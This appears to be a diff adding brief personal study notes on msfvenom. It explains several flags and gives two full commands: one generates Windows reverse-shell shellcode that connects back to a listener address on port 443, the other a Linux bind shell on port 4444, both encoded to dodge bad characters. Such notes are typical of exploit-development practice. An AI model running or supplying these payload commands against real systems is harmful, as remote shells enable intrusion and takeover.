@@ -1,0 +1,12 @@
+msfvenom -- allows you to generate shellcode
+-f is c formated layout easier for python
+-a architecure x86
+-b encode bad characters
+--platform represent the platform
+-e encoder
+-k make exploit run in new shell. Try to see if the program does not crash with option
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+
+for linux
+
+msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" -- platform linux -a x86 -e x86/shikata_ga_nai
